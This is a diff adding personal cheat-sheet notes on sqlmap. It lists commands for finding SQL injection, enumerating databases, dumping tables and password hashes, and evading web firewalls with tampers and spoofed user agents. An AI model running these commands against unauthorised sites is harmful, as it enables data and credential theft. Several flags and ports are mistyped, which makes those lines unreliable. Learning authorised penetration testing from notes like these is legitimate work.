@@ -1,5 +1,107 @@
 SQLMap Theory & cmds:
+To identify whether sql vuln is present on website just add ' after the link of the website. If the response is an ERROR msg of SQL syntax & Warning msg then that meas vuln exist.
+
+Features: 
+Techniques: Finds SQL inj using following techniques
+B: Boolean-based blind
+E: Error-based
+U: Union query
+S: Stacked Queries
+T: Time-Based blind
+Q: Inline queries
+Ex: --technique-"B"
+sqlmap -u <url> --crawl 3 -technique-"U"
+
+crawl: Parameter which scans & identifies the vulnerable parameter in the url. Use batch feature to select default answers.
+Depth 1,2,3,4
+Ex: --crawl 3
+sqlmap -u <url> --crawl 3
+
+enum : Enumerates the vuln link
+Enumeration commands:
+
+1. -a --> retrive everything
+
+2. -b-> retrieve DBMS banner
+
+3. -current-user--> dbms current user
+
+4. -current-db --> current database
+
+5. -passwords --> enumerate dbms user password hashes
+
+6. -dbs->dbms database
+
+7. -tables -> dbms database tables
+
+8. -columns --> dbms schema
+
+9. -dump-> dbms database table entries
+
+10. -dump-all --> dbms databases tables entries
+
+11. -D->dbms database to enumerate
+
+12. -T-> DBMS databases table to enumerate
+
+13. -C--> dbms database table column to enumerate
+sqlmap -u <url> --current-user --current-db --hostname 
+
+batch: Selects the default answers during crawl.
+sqlmap -u <url> --crawl 3 --batch
+
+risk: Provides 3 features. When you don't get vuln directly then just try with diff payloads. Range 1-3. Mostly use 1.
+sqlmap -u <url> --crawl 3 --batch --risk 1
+
+level: level up the enum and check for the vuln in depth. (Range 1-5)
+sqlmap -u <url> --crawl 3 --batch --level 1
+
+threads How many connections to be used at a time
+sqlmap -u <url> --crawl 3 --threads 3 (range 1-10)
+
+verbosity: Gives the details of the attack that is being performed (Range 0-6)
+sqlmap -u <url> --crawl 3 --batch --v 4
+
+proxy: Whatever payload you're trying to send, send it via burp to the server.
+sqlmap -u <url> --crwal 3 --proxy="http://127.0.0.1:4444"  
+Go to burp>proxy>options>proxy listeners> Add> Bind to port: 444> click all interfaces>ok>on intercept>execute above cmd and catch req
+
+Brute force burp parameter: Once you capture a req from burp & now you want to test whether the parameters (ex: uname & pass) are vuln. (not work)
+1. Capure login req via burp 
+2. Save the req and pass to salmap (copy the text save it to a file)
+3. sqlmap -r filename --dbs --batch (this will tell you whether it is vuln or not) (or left click and select save req)
+
+Save output: sqlmap -u <url> --crawl 3 --output-dir="path"
+
+user agent: sqlmap -u <url> --crawl 3 --user-agent="GECKO_Chrome" bypass firewall
+
+tampers: sqlmap --list-tampers (When firewall block sql related keywords use this) (Tampers the payload data so that it be by passed through firewall)
+sqlmap -u <url> --crawl 3 --tamper=base64encode
+
+Brute Force login page: Helps to identify sql vuln on login page. We need the following things:
+1. login page url 
+2. variable names of username, password and login button (inspect and check the input name parameter) 
+3. Redirect link (Inspect and check action parameter of login page in form tag)
+cmds: sqlmap -u <login page url> --forms 
+it will ask for permission to tast a form if this form matches with the redirect link the allow it oherwise don't. It will ask for random values click Y. Follow the redirects and default permissions
+Exploit the given parameter: sqlmap -u <given url> --data="uname=abc&pass=abc&login=submit" (variable names; random value to username and passsword button & for login var name) --dbs
 
 cmds:
-1. sqlmap -u url --random-agent 
-2. sqlmap -u url --randomagent --dump
+1. sqlmap -u <url> --random-agent 
+2. sqlmap -u <url> --random-agent --dump
+3. sqlmap -u <url> --dbs (no of db present on the website)
+4. sqlmap -u <url> -D <db_name> -T <table_name> --columns (no of columns in db)
+5. sqlmap -u <url> -D <db_name> -T <table_name> -C <col_name> --dump (reveal data in that column)
+6. sqlmap -u <url> -D <db_name> --dump-all (dumps all the data of table present in that db)
+
+
+
+-u
+--forms
+--data
+--headers
+--user-agent
+--cookie
+--flush-session
+--output-dir
+--tamper 
